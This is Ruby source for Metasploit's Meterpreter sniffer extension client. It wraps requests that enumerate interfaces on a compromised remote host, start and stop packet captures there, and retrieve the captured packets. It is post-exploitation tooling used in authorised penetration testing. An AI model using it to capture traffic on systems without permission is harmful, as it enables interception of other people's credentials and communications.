#!/usr/bin/env ruby

require 'rex/post/meterpreter/extensions/sniffer/tlv'
require 'rex/proto/smb/utils'

module Rex
module Post
module Meterpreter
module Extensions
module Sniffer

###
#
# This meterpreter extension can be used to capture remote traffic
#
###
class Sniffer < Extension


	def initialize(client)
		super(client, 'sniffer')

		client.register_extension_aliases(
			[
				{ 
					'name' => 'sniffer',
					'ext'  => self
				},
			])
	end


	# Enumerate the remote sniffable interfaces
	def interfaces()
		ifaces = []
		ifacei = 0
		request = Packet.create_request('sniffer_interfaces')
		response = client.send_request(request)
		response.each(TLV_TYPE_SNIFFER_INTERFACES) { |p|
			vals  = p.tlvs.map{|x| x.value }
			iface = { }
			ikeys = %W{idx name description type mtu wireless usable dhcp}
			ikeys.each_index { |i| iface[ikeys[i]] = vals[i] }
			ifaces << iface
		}		
		return ifaces
	end
	
	# Start a packet capture on an opened interface
	def capture_start(intf,maxp=200000)
		request = Packet.create_request('sniffer_capture_start')
		request.add_tlv(TLV_TYPE_SNIFFER_INTERFACE_ID, intf.to_i)
		request.add_tlv(TLV_TYPE_SNIFFER_PACKET_COUNT, maxp.to_i)
		response = client.send_request(request)	
	end
	
	# Stop an active packet capture
	def capture_stop(intf)
		request = Packet.create_request('sniffer_capture_stop')
		request.add_tlv(TLV_TYPE_SNIFFER_INTERFACE_ID, intf.to_i)
		response = client.send_request(request)	
	end
	
	# Retrieve stats about a current capture
	def capture_stats(intf)
		request = Packet.create_request('sniffer_capture_stats')
		request.add_tlv(TLV_TYPE_SNIFFER_INTERFACE_ID, intf.to_i)
		response = client.send_request(request)
		{
			'packets' => response.get_tlv_value(TLV_TYPE_SNIFFER_PACKET_COUNT),
			'bytes'   => response.get_tlv_value(TLV_TYPE_SNIFFER_BYTE_COUNT),
		}
	end
	
	# Retrieve the packet dump for this capture
	def capture_dump(intf)
		request = Packet.create_request('sniffer_capture_dump')
		request.add_tlv(TLV_TYPE_SNIFFER_INTERFACE_ID, intf.to_i)
		response = client.send_request(request)	
		
		res  = {}
		data = response.tlvs.map{|x| x.value}
		data.shift # sniffer_capture_dump
		data.shift # request id
		data.pop   # result code
		
		# Grab the packet and byte count stats
		res[:packet_count] = data.shift
		res[:byte_count]   = data.shift
		res[:packets]      = []

		# Parse the packet queue
		while(data.length > 3)
			res[:packets] << { 
				:id   => data.shift,
				:time => Time.at(Rex::Proto::SMB::Utils.time_smb_to_unix(data.shift, data.shift)), 
				:data => data.shift
			}
		end

		# Sort the packets by receive order
		res[:packets].sort!{|a,b| a[:id] <=> b[:id]}
		res	
	end
end

end; end; end; end; end
